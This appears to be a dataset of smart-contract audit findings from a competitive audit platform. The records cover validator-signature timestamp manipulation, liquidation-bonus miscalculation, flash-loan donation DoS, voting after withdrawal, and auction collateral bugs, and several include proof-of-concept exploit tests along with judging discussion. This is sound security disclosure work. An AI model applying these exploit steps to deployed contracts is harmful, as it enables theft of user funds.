Validator threshold can be bypassed: a single compromised validator can update minter's state to historical stateчmediumч```\n        minTimestamp_ = _verifyValidatorSignatures(\n            msg.sender,\n            collateral_,\n            retrievalIds_,\n            metadataHash_,\n            validators_,\n            timestamps_,\n            signatures_\n        );\n        // rest of code\n        _updateCollateral(msg.sender, safeCollateral_, minTimestamp_);\n        // rest of code\n```\nч"The `updateCollateralValidatorThreshold` specifies the minimum number of validators needed to confirm the validity of `updateCollateral` data. However, just one compromised validator is enough to alter a minter's collateral status. In particular, this vulnerability allows the compromised validator to set the minter's state back to a historical state, allowing malicious minters to increase their collateral.\nThe `updateCollateral()` function calls the `_verifyValidatorSignatures()` function, which calculates the minimum timestamp signed by all validators. This timestamp is then used to update the minter state's `_minterStates[minter_].updateTimestamp`. The constraint during this process is that the `_minterStates[minter_].updateTimestamp` must always be increasing.\nFunction updateCollateral():\n```\n        minTimestamp_ = _verifyValidatorSignatures(\n            msg.sender,\n            collateral_,\n            retrievalIds_,\n            metadataHash_,\n            validators_,\n            timestamps_,\n            signatures_\n        );\n        // rest of code\n        _updateCollateral(msg.sender, safeCollateral_, minTimestamp_);\n        // rest of code\n```\n\nFunction _updateCollateral():\n```\n    function _updateCollateral(address minter_, uint240 amount_, uint40 newTimestamp_) internal {\n        uint40 lastUpdateTimestamp_ = _minterStates[minter_].updateTimestamp;\n\n        // MinterGateway already has more recent collateral update\n        if (newTimestamp_ <= lastUpdateTimestamp_) revert StaleCollateralUpdate(newTimestamp_, lastUpdateTimestamp_);\n\n        _minterStates[minter_].collateral = amount_;\n        _minterStates[minter_].updateTimestamp = newTimestamp_;\n    }\n```\n\nIf we have 1 compromised validator, its signature can be manipulated to any chosen timestamp. Consequently, this allows for control over the timestamp in `_minterStates[minter_].updateTimestamp` making it possible to update the minter's state to a historical state. An example is given in the following proof of concept. The key here is that even though `updateCollateralValidatorThreshold` may be set to 2 or even 3, as long as 1 validator is compromised, the attack vector would work, thus defeating the purpose of having a validator threshold.\nProof Of Concept\nIn this unit test, `updateCollateralInterval` is set to 2000 (default value). The `updateCollateralValidatorThreshold` is set to 2, and the `_validator1` is compromised. Following the steps below, we show how we update minter to a historical state:\nInitial timestamp is `T0`.\n100 seconds passed, the current timestamp is `T0+100`. Deposit 100e6 collateral at `T0+100`. `_validator0` signs signature at `T0+100`, and `_validator1` signs signature at `T0+1`. After `updateCollateral()`, minter state collateral = 100e6, and updateTimestamp = `T0+1`.\nAnother 100 seconds passed, the current timestamp is `T0+200`. Propose retrieval for all collateral, and perform the retrieval offchain. `_validator0` signs signature at `T0+200`, and `_validator1` signs signature at `T0+2`. After `updateCollateral()`, minter state collateral = 0, and updateTimestamp = `T0+2`.\nAnother 100 seconds passed, the current timestamp is `T0+300`. Reuse `_validator0` signature from step 1, it is signed on timestamp `T0+100`. `_validator1` signs collateral=100e6 at `T0+3`. After `updateCollateral()`, minter state collateral = 100e6, and updateTimestamp = `T0+3`.\nNow, the minter is free to perform minting actions since his state claims collateral is 100e6, even though he has already retrieved it back in step 2. The mint proposal may even be proposed between step 1 and step 2 to reduce the mintDelay the minter has to wait.\n```\n    function test_collateralStatusTimeTravelBySingleHackedValidator() external {\n        _ttgRegistrar.updateConfig(TTGRegistrarReader.UPDATE_COLLATERAL_VALIDATOR_THRESHOLD, bytes32(uint256(2)));\n\n        // Arrange validator addresses in increasing order.\n        address[] memory validators = new address[](2);\n        validators[0] = _validator2;\n        validators[1] = _validator1;\n\n        uint initialTimestamp = block.timestamp;\n        bytes[] memory cacheSignatures = new bytes[](2);\n        // 1. Deposit 100e6 collateral, and set malicious validator timestamp to `initialTimestamp+1` during `updateCollateral()`.\n        {\n            vm.warp(block.timestamp + 100);\n\n            uint256[] memory retrievalIds = new uint256[](0);\n            uint256[] memory timestamps = new uint256[](2);\n            timestamps[0] = block.timestamp;\n            timestamps[1] = initialTimestamp + 1;\n\n            bytes[] memory signatures = new bytes[](2);\n            signatures[0] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 100e6, retrievalIds, bytes32(0), block.timestamp, _validator2Pk);\n            signatures[1] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 100e6, retrievalIds, bytes32(0), initialTimestamp + 1, _validator1Pk);\n            cacheSignatures = signatures;\n\n            vm.prank(_minter1);\n            _minterGateway.updateCollateral(100e6, retrievalIds, bytes32(0), validators, timestamps, signatures);\n\n            assertEq(_minterGateway.collateralOf(_minter1), 100e6);\n            assertEq(_minterGateway.collateralUpdateTimestampOf(_minter1), initialTimestamp + 1);\n        }\n\n        // 2. Retrieve all collateral, and set malicious validator timestamp to `initialTimestamp+2` during `updateCollateral()`.\n        {\n            vm.prank(_minter1);\n            uint256 retrievalId = _minterGateway.proposeRetrieval(100e6);\n\n            vm.warp(block.timestamp + 100);\n\n            uint256[] memory newRetrievalIds = new uint256[](1);\n            newRetrievalIds[0] = retrievalId;\n\n            uint256[] memory timestamps = new uint256[](2);\n            timestamps[0] = block.timestamp;\n            timestamps[1] = initialTimestamp + 2;\n\n            bytes[] memory signatures = new bytes[](2);\n            signatures[0] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 0, newRetrievalIds, bytes32(0), block.timestamp, _validator2Pk);\n            signatures[1] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 0, newRetrievalIds, bytes32(0), initialTimestamp + 2, _validator1Pk);\n\n            vm.prank(_minter1);\n            _minterGateway.updateCollateral(0, newRetrievalIds, bytes32(0), validators, timestamps, signatures);\n\n            assertEq(_minterGateway.collateralOf(_minter1), 0);\n            assertEq(_minterGateway.collateralUpdateTimestampOf(_minter1), initialTimestamp + 2);\n        }\n\n        // 3. Reuse signature from step 1, and set malicious validator timestamp to `initialTimestamp+3` during `updateCollateral()`.\n        //    We have successfully ""travelled back in time"", and minter1's collateral is back to 100e6.\n        {\n            vm.warp(block.timestamp + 100);\n\n            uint256[] memory retrievalIds = new uint256[](0);\n            uint256[] memory timestamps = new uint256[](2);\n            timestamps[0] = block.timestamp - 200;\n            timestamps[1] = initialTimestamp + 3;\n\n            bytes[] memory signatures = new bytes[](2);\n            signatures[0] = cacheSignatures[0];\n            signatures[1] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 100e6, retrievalIds, bytes32(0), initialTimestamp + 3, _validator1Pk);\n\n            vm.prank(_minter1);\n            _minterGateway.updateCollateral(100e6, retrievalIds, bytes32(0), validators, timestamps, signatures);\n\n            assertEq(_minterGateway.collateralOf(_minter1), 100e6);\n            assertEq(_minterGateway.collateralUpdateTimestampOf(_minter1), initialTimestamp + 3);\n        }\n    }\n```\n"чUse the maximum timestamp of all validators instead of minimum, or take the threshold-last minimum instead of the most minimum.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\ncompromises happens due to user mistake which is invalid according to sherlock rules and also; the validator has the power to update the minter state including mint request.\ndeluca-mike\nThis is a great catch! Please reopen this as it is the most clear issue that demonstrates the issue in the simplest/purest form. The others may be duplicates if this (albeit less valid, clear, or event incorrect).\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/MZero-Labs/protocol/pull/163ч"As shown in the proof of concept, the minter can use the extra collateral to mint M tokens for free.\nOne may claim that during minting, the `collateralOf()` function checks for `block.timestamp < collateralExpiryTimestampOf(minter_)`, however, since during deployment `updateCollateralInterval` is set to 86400, that gives us enough time to perform the attack vector before ""fake"" collateral expires.\nCode Snippet\nTool used\nFoundary"
Liquidation bonus scales exponentially instead of linearly.чmediumч```\n    function getLiquidationBonus(\n        address token,\n        uint256 borrowedAmount,\n        uint256 times\n    ) public view returns (uint256 liquidationBonus) {\n        // Retrieve liquidation bonus for the given token\n        Liquidation memory liq = liquidationBonusForToken[token];\n        unchecked {\n            if (liq.bonusBP == 0) {\n                // If there is no specific bonus for the token\n                // Use default bonus\n                liq.minBonusAmount = Constants.MINIMUM_AMOUNT;\n                liq.bonusBP = dafaultLiquidationBonusBP;\n            }\n            liquidationBonus = (borrowedAmount * liq.bonusBP) / Constants.BP;\n\n            if (liquidationBonus < liq.minBonusAmount) {\n                liquidationBonus = liq.minBonusAmount;\n            }\n            liquidationBonus *= (times > 0 ? times : 1);\n        }\n    }\n```\nчLiquidation bonus scales exponentially instead of linearly.\nLet's look at the code of `getLiquidationBonus`\n```\n    function getLiquidationBonus(\n        address token,\n        uint256 borrowedAmount,\n        uint256 times\n    ) public view returns (uint256 liquidationBonus) {\n        // Retrieve liquidation bonus for the given token\n        Liquidation memory liq = liquidationBonusForToken[token];\n        unchecked {\n            if (liq.bonusBP == 0) {\n                // If there is no specific bonus for the token\n                // Use default bonus\n                liq.minBonusAmount = Constants.MINIMUM_AMOUNT;\n                liq.bonusBP = dafaultLiquidationBonusBP;\n            }\n            liquidationBonus = (borrowedAmount * liq.bonusBP) / Constants.BP;\n\n            if (liquidationBonus < liq.minBonusAmount) {\n                liquidationBonus = liq.minBonusAmount;\n            }\n            liquidationBonus *= (times > 0 ? times : 1);\n        }\n    }\n```\n\nAs we can see, the liquidation bonus is based on the entire `borrowAmount` and multiplied by the number of new loans added. The problem is that it is unfair when the user makes a borrow against multiple lenders.\nIf a user takes a borrow for X against 1 lender, they'll have to pay a liquidation bonus of Y. However, if they take a borrow for 3X against 3 lenders, they'll have to pay 9Y, meaning that taking a borrow against N lenders leads to overpaying liquidation bonus by N times.\nFurthermore, if the user simply does it in multiple transactions, they can avoid these extra fees (as they can simply call `borrow` for X 3 times and pay 3Y in Liquidation bonuses)чmake liquidation bonus simply a % of totalBorrowed\nDiscussion\nfann95\nWe discussed as a team multiplying the bonus depending on the method of taking out a loan and ultimately decided to abandon it completely. a few days ago I made the corresponding commit https://github.com/RealWagmi/wagmi-leverage/commit/7575ab6659e99e59f5b7b7d1454649091c0295c6\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/RealWagmi/wagmi-leverage/commit/7575ab6659e99e59f5b7b7d1454649091c0295c6.\nsherlock-admin3\n2 comment(s) were left on this issue during the judging contest.\nWangAudit commented:\ndecided that it's a H not an M cause even if it's intended behaviour; user can easily bypass it; or if it's not intended' then it will be applied every time when times > 2\ntakarez commented:\ni think that is a design choice to charge whenever there's a borrow.\nfann95\n2 comment(s) were left on this issue during the judging contest.\nWangAudit commented:\ndecided that it's a H not an M cause even if it's intended behaviour; user can easily bypass it; or if it's not intended' then it will be applied every time when times > 2\ntakarez commented:\ni think that is a design choice to charge whenever there's a borrow.\nThe liquidation bonus was charged more than initially expected, so the user’s cunning could only lead to a fair payment. But ultimately the bonus would still be returned to the trader. The trader paid a more liquidation bonus if he extracted more than one NFT position, which in itself is a rare case... anyway, we removed it from the code..\nspacegliderrrr\nFix looks good, liquidation bonus is now correctly proportional to borrow amount, no matter the number of lenders.\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чLoss of funds\nCode Snippet\nTool used\nManual Review
When the amout of token acquired by a flash loan exceeds the expected value, the callback function will fail.чmediumч```\n// Swap tokens to repay the flash loan\nuint256 holdTokenAmtIn = _v3SwapExact(\n    v3SwapExactParams({\n        isExactInput: false,\n        fee: decodedData.fee,\n        tokenIn: decodedData.holdToken,\n        tokenOut: decodedData.saleToken,\n        amount: amountToPay\n    })\n);\ndecodedData.holdTokenDebt -= decodedData.zeroForSaleToken\n    ? decodedData.amounts.amount1\n    : decodedData.amounts.amount0;\n\n// Check for strict route adherence, revert the transaction if conditions are not met\n(decodedData.routes.strict && holdTokenAmtIn > decodedData.holdTokenDebt).revertError(\n    ErrLib.ErrorCode.SWAP_AFTER_FLASH_LOAN_FAILED\n);\n```\nчWhen the amout of token acquired by a flash loan exceeds the expected value, the callback function will fail.\nThe function `wagmiLeverageFlashCallback` is used to handle the repayment operation after flash loan. After obtaining enough saleToken, it uses `_v3SwapExact` to convert the saleToken into holdToken. We know that the amount of holdTokens (holdTokenAmtIn) is proportional to the amount of saleTokens (amountToPay) obtained from flash loans. Later, the function will check the `holdTokenAmtIn` is no large than decodedData.holdTokenDebt.\n```\n// Swap tokens to repay the flash loan\nuint256 holdTokenAmtIn = _v3SwapExact(\n    v3SwapExactParams({\n        isExactInput: false,\n        fee: decodedData.fee,\n        tokenIn: decodedData.holdToken,\n        tokenOut: decodedData.saleToken,\n        amount: amountToPay\n    })\n);\ndecodedData.holdTokenDebt -= decodedData.zeroForSaleToken\n    ? decodedData.amounts.amount1\n    : decodedData.amounts.amount0;\n\n// Check for strict route adherence, revert the transaction if conditions are not met\n(decodedData.routes.strict && holdTokenAmtIn > decodedData.holdTokenDebt).revertError(\n    ErrLib.ErrorCode.SWAP_AFTER_FLASH_LOAN_FAILED\n);\n```\n\nIn the function `_excuteCallback`, the amount of token finally obtained by the user through flash loan is `flashBalance`, which is the balance of the contract.\n```\n// Transfer the flashBalance to the recipient\ndecodedData.saleToken.safeTransfer(decodedDataExt.recipient, flashBalance);\n// Invoke the WagmiLeverage callback function with updated parameters\nIWagmiLeverageFlashCallback(decodedDataExt.recipient).wagmiLeverageFlashCallback(\n    flashBalance,\n    interest,\n    decodedDataExt.originData\n);\n```\n\nNow let me describe how the attacker compromises the flash loans.\nFirst, the attacker makes a donation to the `FlashLoanAggregator` contract before the victim performs a flash loan (using front-run). Then victim performs a flash loan, and he/she will get much more flashBalance than expected. Finally, in the function `wagmiLeverageFlashCallback`, the holdTokenAmtIn is larger than experted, which leads to fail.чIn the function `_excuteCallback`, the amount of token finally obtained by the user through flash loan should be the the balance difference during the flash loan period.\nDiscussion\nWangSecurity\nseems to be working as expected since all these parameters are user supplied (I mean decodedData.routes.strict)\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/RealWagmi/wagmi-leverage/commit/37b0268ec936d63beee873dd61b096b47cd673c1.\nWangSecurity\nAfter additional discussions, we decided to make this a valid medium, cause it's a valid attack vector, but takes a lot of funding and additional external factors\nspacegliderrrr\nFix looks good, in case aggregator has extra funds, callback will not have to repay for them.\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чDOS\nCode Snippet\nTool used\nManual Review
User Can Vote Even When They Have 0 Locked Mento (Edge Case)чmediumч```\nfunction getAvailableForWithdraw(address account) public view returns (uint96) {\n    uint96 value = accounts[account].amount;\n    if (!stopped) {\n      uint32 currentBlock = getBlockNumber();\n      uint32 time = roundTimestamp(currentBlock);\n      uint96 bias = accounts[account].locked.actualValue(time, currentBlock);\n      value = value - (bias);\n    }\n    return value;\n```\nч"There exists an edge case where the user will be withdrawing his entire locked MENTO amount and even then will be able to vote , this is depicted by a PoC to make things clearer.\nThe flow to receiving voting power can be understood in simple terms as follows ->\nUsers locks his MENTO and chooses a delegate-> received veMENTO which gives them(delegatee) voting power (there's cliff and slope at play too)\nThe veMENTO is not a standard ERC20 , it is depicted through ""lines"" , voting power declines ( ie. slope period) with time and with time you can withdraw more of your MENTO.\nThe edge case where the user will be withdrawing his entire locked MENTO amount and even then will be able to vote is as follows ->\n2.) The owner of the contract ""stops"" the contract for some emergency reason.\n4.) Since the contract is stopped , the `getAvailableForWithdraw` will return the entire locked amount of the user as withdrawable\n```\nfunction getAvailableForWithdraw(address account) public view returns (uint96) {\n    uint96 value = accounts[account].amount;\n    if (!stopped) {\n      uint32 currentBlock = getBlockNumber();\n      uint32 time = roundTimestamp(currentBlock);\n      uint96 bias = accounts[account].locked.actualValue(time, currentBlock);\n      value = value - (bias);\n    }\n    return value;\n```\n\n5.) The user receives his entire locked amount in L101.\n6.) The owner ""start()"" the contract again\n7.) Since the user's veMENTO power was not effected by the above flow , there still exists veMENTO a.k.a voting power to the delegate, and the user's delegate is still able to vote on proposals (even when the user has withdrew everything).\nPOC\n```\nfunction test_Poc_Stop() public {\n\n   vm.prank(governanceTimelockAddress);\n   mentoToken.transfer(alice, 10_000e18);\n\n   vm.prank(governanceTimelockAddress);\n   mentoToken.transfer(bob, 10_000e18);\n\n   vm.prank(alice);\n   locking.lock(alice, alice, 10_000e18, 1, 103);\n\n   vm.prank(bob);\n   locking.lock(bob, bob, 1500e18, 1, 103);\n\n   vm.timeTravel(BLOCKS_DAY);\n\n   uint256 newVotingDelay = BLOCKS_DAY;\n   uint256 newVotingPeriod = 2 * BLOCKS_WEEK;\n   uint256 newThreshold = 5000e18;\n   uint256 newQuorum = 10; //10%\n   uint256 newMinDelay = 3 days;\n   uint32 newMinCliff = 6;\n   uint32 newMinSlope = 12;\n\n   vm.prank(alice);\n   (\n     uint256 proposalId,\n     address[] memory targets,\n     uint256[] memory values,\n     bytes[] memory calldatas,\n     string memory description\n   ) = Proposals._proposeChangeSettings(\n       mentoGovernor,\n       governanceTimelock,\n       locking,\n       newVotingDelay,\n       newVotingPeriod,\n       newThreshold,\n       newQuorum,\n       newMinDelay,\n       newMinCliff,\n       newMinSlope\n     );\n\n   // ~10 mins\n   vm.timeTravel(120);\n\n   \n\n   vm.startPrank(governanceTimelockAddress);\n   locking.stop();\n   vm.stopPrank();\n\n   uint bal2 = mentoToken.balanceOf(alice);\n   console.log(bal2);\n\n   vm.startPrank(alice);\n   locking.withdraw();\n   vm.stopPrank();\n\n   vm.startPrank(governanceTimelockAddress);\n   locking.start();\n   vm.stopPrank();\n\n   uint bal = mentoToken.balanceOf(alice);\n   console.log(bal);\n   vm.prank(alice);\n   \n\n   console.log(mentoGovernor.castVote(proposalId, 1));\n }\n```\n\nYou can see the Alice withdrew her entire locked amount and still was able to caste her vote."чWhen the entire amount is withdrawn adjust the logic to remove the corresponding lines for the delegator.\nDiscussion\nnevillehuang\nValid medium, users retain vote in an edge case scenario then holds when owners stops (pause) contractчUser still able to vote even when the entire locked amount is withdrawn.\nCode Snippet\nTool used\nFoundry
Highest bidder can withdraw his collateral due to a missing check in _cancelAllBidsчhighч```\n        require(\n            bidder != l.highestBids[tokenId][round].bidder,\n            'EnglishPeriodicAuction: Cannot cancel bid if highest bidder'\n        );\n```\nчA bidder with the highest bid cannot cancel his bid since this would break the auction. A check to ensure this was implemented in `_cancelBid`.\nHowever, this check was not implemented in `_cancelAllBids`, allowing the highest bidder to withdraw his collateral and win the auction for free.\nThe highest bidder should not be able to cancel his bid, since this would break the entire auction mechanism.\nIn `_cancelBid` we can find a require check that ensures this:\n```\n        require(\n            bidder != l.highestBids[tokenId][round].bidder,\n            'EnglishPeriodicAuction: Cannot cancel bid if highest bidder'\n        );\n```\n\nYet in `_cancelAllBids`, this check was not implemented.\n```\n     * @notice Cancel bids for all rounds\n     */\n    function _cancelAllBids(uint256 tokenId, address bidder) internal {\n        EnglishPeriodicAuctionStorage.Layout\n            storage l = EnglishPeriodicAuctionStorage.layout();\n\n        uint256 currentAuctionRound = l.currentAuctionRound[tokenId];\n\n        for (uint256 i = 0; i <= currentAuctionRound; i++) {\n            Bid storage bid = l.bids[tokenId][i][bidder];\n\n            if (bid.collateralAmount > 0) {\n                // Make collateral available to withdraw\n                l.availableCollateral[bidder] += bid.collateralAmount;\n\n                // Reset collateral and bid\n                bid.collateralAmount = 0;\n                bid.bidAmount = 0;\n            }\n        }\n    }\n```\n\nExample: User Bob bids 10 eth and takes the highest bidder spot. Bob calls `cancelAllBidsAndWithdrawCollateral`.\nThe `_cancelAllBids` function is called and this makes all the collateral from all his bids from every round available to Bob. This includes the current round `<=` and does not check if Bob is the current highest bidder. Nor is `l.highestBids[tokenId][round].bidder` reset, so the system still has Bob as the highest bidder.\nThen `_withdrawCollateral` is automatically called and Bob receives his 10 eth back.\nThe auction ends. If Bob is still the highest bidder, he wins the auction and his bidAmount of 10 eth is added to the availableCollateral of the oldBidder.\nIf there currently is more than 10 eth in the contract (ongoing auctions, bids that have not withdrawn), then the oldBidder can withdraw 10 eth. But this means that in the future a withdraw will fail due to this missing 10 eth.чImplement the require check from _cancelBid to _cancelAllBids.чA malicious user can win an auction for free.\nAdditionally, either the oldBidder or some other user in the future will suffer the loss.\nIf this is repeated multiple times, it will drain the contract balance and all users will lose their locked collateral.\nCode Snippet\nTool used\nManual Review
Auction fails if the 'Honorarium Rate' is 0%чmediumч```\nuint256 totalCollateralAmount = bid.collateralAmount + collateralAmount;\n```\nчThe Honorarium Rate is the required percentage of a winning Auction Pitch bid that the Steward makes to the Creator Circle at the beginning of each Stewardship Cycle.\n`$$ Winning Bid * Honorarium Rate = Periodic Honorarium $$`\nTo mimic the dynamics of private ownership, the Creator Circle may choose a 0% Honorarium Rate. However, doing so breaks the functionality of the protocol.\n```\nuint256 totalCollateralAmount = bid.collateralAmount + collateralAmount;\n```\n\nHere, `bid.collateralAmount` is the cumulative collateral deposited by the bidder in previous bids during the current auction round(i.e, zero if no bids were placed), and `collateralAmount` is the collateral to be deposited to place the bid. However the `_placeBid` function requires that `totalCollateralAmount` is strictly greater than `bidAmount` if the bidder is not the current owner of the Stewardship License. This check fails when the `feeAmount` is zero and this causes a Denial of Service to users trying to place a bid. Even if the users try to bypass this by depositing a value slightly larger than `bidAmount`, the `_checkBidAmount` function would still revert with `'Incorrect bid amount'`\nPOC\nThe following test demonstrates the above-mentioned scenario :\n```\n describe('exploit', function () {\n    it('POC', async function () {\n      // Auction start: Now + 100\n      // Auction end: Now + 400\n      const instance = await getInstance({\n        auctionLengthSeconds: 300,\n        initialPeriodStartTime: (await time.latest()) + 100,\n        licensePeriod: 1000,\n      });\n      const licenseMock = await ethers.getContractAt(\n        'NativeStewardLicenseMock',\n        instance.address,\n      );\n\n      // Mint token manually\n      const steward = bidder2.address;\n      await licenseMock.mintToken(steward, 0);\n\n      // Start auction\n      await time.increase(300);\n        \n      const bidAmount = ethers.utils.parseEther('1.0');\n      const feeAmount = await instance.calculateFeeFromBid(bidAmount);\n      const collateralAmount = feeAmount.add(bidAmount);\n\n      // Reverts when a user tries to place a bid\n      await expect( instance\n        .connect(bidder1)\n        .placeBid(0, bidAmount, { value: collateralAmount })).to.be.revertedWith('EnglishPeriodicAuction: Collateral must be greater than current bid');\n\n      \n    \n      const extraAmt = ethers.utils.parseEther('0.1');\n      const collateralAmount1 = feeAmount.add(bidAmount).add(extraAmt);\n      \n      // Also reverts when the user tries to deposit collateral slighty greater than bid amount\n      await expect( instance\n        .connect(bidder1)\n        .placeBid(0, bidAmount, { value: collateralAmount1 })).to.be.revertedWith('EnglishPeriodicAuction: Incorrect bid amount');  \n      \n      // Only accepts a bid from the current steward\n      \n      await expect( instance\n        .connect(bidder2)\n        .placeBid(0, bidAmount, { value: 0 })).to.not.be.reverted;\n\n    });\n  });\n```\n\nTo run the test, copy the code above to `EnglishPeriodicAuction.ts` and alter L#68 as follows :\n```\n// Remove the line below\n          [await owner.getAddress(), licensePeriod, 1, 10],\n// Add the line below\n          [await owner.getAddress(), licensePeriod, 0, 10],\n```\n\nRun `yarn run hardhat test --grep 'POC'`ч"```\n// Remove the line below\n totalCollateralAmount > bidAmount,\n// Add the line below\n totalCollateralAmount >= bidAmount, \n```\n\nDiscussion\nsammy-tm\nEscalate It states in the docs that the Honorarium rate may be 0 to mimic private ownership. However, as clearly described in the issue above, this functionality fails. https://pco-art-docs.vercel.app/for-artists/pco-settings ""Lower Honorarium Rates will tend to lead to higher nominal Auction Prices: the capital commitment required of the Steward each cycle is lower given a valuation. A 0% Honorarium Rate effectively would mimic the dynamics of private ownership (with a periodic auction in which the Steward could set an arbitrarily high reserve price). The theoretically optimal rate from a Periodic Honorarium maximization perspective is equal to the probability that a new Steward emerges who values the work more than the current Steward (e.g. 1 in every 10 periods implies a 10% optimal rate), but that, of course, might not be the priority.""\nsherlock-admin2\nEscalate It states in the docs that the Honorarium rate may be 0 to mimic private ownership. However, as clearly described in the issue above, this functionality fails. https://pco-art-docs.vercel.app/for-artists/pco-settings ""Lower Honorarium Rates will tend to lead to higher nominal Auction Prices: the capital commitment required of the Steward each cycle is lower given a valuation. A 0% Honorarium Rate effectively would mimic the dynamics of private ownership (with a periodic auction in which the Steward could set an arbitrarily high reserve price). The theoretically optimal rate from a Periodic Honorarium maximization perspective is equal to the probability that a new Steward emerges who values the work more than the current Steward (e.g. 1 in every 10 periods implies a 10% optimal rate), but that, of course, might not be the priority.""\nThe escalation could not be created because you are not exceeding the escalation threshold.\nYou can view the required number of additional valid issues/judging contest payouts in your Profile page, in the Sherlock webapp.\ncawfree\nEscalate\nThe amazing supporting documentation for RadicalxChange states that one of the intended logical underpinnings of the fee model should be to mimic private ownership when operating using a 0% honorarium: .\nHowever, the codebase strictly does not permit this due to emergent strict equality checks, which only arise later when actually trying to place a bid. The collection deployer finds out too late.\nThe counterargument to this finding is it just seems low severity given that this can be resolved by doing something like redeploy to a collection with `1 wei` (i.e. a frontend fix), or even wondering how often communities are going to do this in practicality.\nIt is just clear that this implementation quirk works directly against the advertised functionality (a literal feature), and that should probably play into the severity. People do like free mints after all.\nsherlock-admin2\nEscalate\nThe amazing supporting documentation for RadicalxChange states that one of the intended logical underpinnings of the fee model should be to mimic private ownership when operating using a 0% honorarium: .\nHowever, the codebase strictly does not permit this due to emergent strict equality checks, which only arise later when actually trying to place a bid. The collection deployer finds out too late.\nThe counterargument to this finding is it just seems low severity given that this can be resolved by doing something like redeploy to a collection with `1 wei` (i.e. a frontend fix), or even wondering how often communities are going to do this in practicality.\nIt is just clear that this implementation quirk works directly against the advertised functionality (a literal feature), and that should probably play into the severity. People do like free mints after all.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nAl-Qa-qa\nBesides what @cawfree said, I want to add that if the Artist (Collection Admin), deployed the Collection as immutable (i.e. without an owner). No one will be able to change the fees to just make it `1 wei` (And this point I mentioned in my report 107). This will make all the Auction processes/NFT Collection broken and insolvable.\nzzykxx\nThis is valid. Setting a fee of `0` is a legitimate and expected input and the core functionality of the protocol (auctions) breaks when this is the case.\nHash01011122\nIt appears valid finding to me with duplicates #12 and #107 @gravenp @St4rgarden would you like to add something here??\nsammy-tm\nI would also like to urge the lead judge to re-evaluate the severity of this finding. ""Breaking core functionality"" might be considered High in some cases.\ngravenp\nThe 0% Honorarium example is the theoretical limit, but in practice, it doesn't make sense to configure it that way (the PCO system ends up being a lot of complex code for the current steward to basically hold the art as long as they want). I agree that as implemented, we allowed it, and it breaks things. Our fix will not allow the artist/admin to configure a 0% honorarium as this specific configuration isn't core to our intended functionality.\nHash01011122\nI think this issue is open ended double edge sword where sponsors claiming this cannot be rectified as this is design choice but in my opinion, it suffices medium severity as this breaks protocol's functionality, let me know your thoughts @zzykxx, @gravenp, @Czar102\ngravenp\nI'm fine with whatever the judges decide. Ultimately, our design choice is not to allow 0% honorarium, so the intended functionality won't include supporting this scenario.\nzzykxx\nI think this issue is open ended double edge sword where sponsors claiming this cannot be rectified as this is design choice but in my opinion, it suffices medium severity as this breaks protocol's functionality, let me know your thoughts @zzykxx, @gravenp, @Czar102\nIn my opinion this should be a valid issue unless it was mentioned somewhere public that the 0% honorarium is not allowed/intended.\nHash01011122\nAs mentioned by @zzykxx, this is a valid finding with duplicates #107 and #12\nCzar102\nA 0% Honorarium Rate effectively would mimic the dynamics of private ownership (with a periodic auction in which the Steward could set an arbitrarily high reserve price).\nThe usage of ""would mimic"" instead of ""mimics"" implies that it's either know not to be possible to use such a configuration, or it is undesired for such a configuration to be used.\nThe 0% Honorarium example is the theoretical limit, but in practice, it doesn't make sense to configure it that way (the PCO system ends up being a lot of complex code for the current steward to basically hold the art as long as they want).\nIt seems that using a 0% Honorarium Rate doesn't make sense, hence it doesn't really limit the intended functionality of the implemented codebase.\nAm I mistaken somewhere?\nsammy-tm\nYou're correct; however, it doesn't expressly state that the artists are not supposed to do this. Neither does it prevent them from doing so. A naive artist may read the documentation and want to mimic an IRL auction/ private ownership for their art, so they would set the fees to 0%. But doing so visibly breaks the protocol. This needs to be handled either during configuration (as @gravenp mentioned)\nI agree that as implemented, we allowed it, and it breaks things. Our fix will not allow the artist/admin to configure a 0% honorarium as this specific configuration isn't core to our intended functionality.\nor mitigated using the recommendation in the Issue.\nAl-Qa-qa\nThe documentation did not deny setting 0 fees totally, it expresses that setting 0% is not typically advisable (Or What means this).\nThe 0% Honorarium example is the theoretical limit\nThis sentence does not exist in the docs, The docs did not explain that 0% is prevented or other, it explained that `it's like the Steward owns the thing they're managing as if it were their own property. They get all the benefits without having to pay anything for it`\nSo according to the documentation which was the only resource for that issue in the Auditing period, setting 0% Honorarium was not prevented totally, nor said by the Devs in the README, nor that edge case was handled in the code.\nI hope the issue gets reviewed according to the information that was with us (Auditors) in the Auditing period, The points that the sponsor said after the Auditing finished (In Escalation) should not be taken as proof to either validate or invalidate issues.\nAnd if the likelihood of the issue is LOW, its impact is so HIGH. And this is illustrated in my report, and escalation engagements.\nHash01011122\nThis issue, along with its duplicates #12 and #107, should be deemed valid. It highlights the complication arising from a 0% honorarium rate, contradicting the project documentation which states this as a theoretical limit not reflected in the codebase. Moreover, the documentation does not clearly advise against its use. What are your thoughts, @Czar102?\nEvert0x\nI believe this issue should be valid and the main issue (12) should be assigned Medium severity.\ngravenp\nIt doesn't seem that #12 is the right parent issue to me. #42 and #107 appear to be the proper issues to connect here, @Hash01011122.\nsammy-tm\n#42 is about setting the fee denominator to 0, which is a completely different issue and is invalid.\nAl-Qa-qa\nI read issue `12`, and the issue is about different Root causes and Impact.\nCould you give another look at it @Hash01011122 , and determine your final thought about this issue, whether it is a Dup of `31` and `107` or not?\nsammy-tm\nWent through #12, agree with @Al-Qa-qa that the concern highlighted in the issue is completely different from #31 and #107. I think the judge has incorrectly grouped these together because the mitigation step is the same.\nIf you read carefully, #12 is a wrong interpretation of the codebase and focuses on user input validation (invalid according to sherlock rules)\nQuoting Issue #12 :\nThe root of the issue is the expectation that the fee should be paid on top of the bidAmount, which goes fully against documentation and poses many problems. Since the protocol has the stated requirement of 100% collateralisation, many 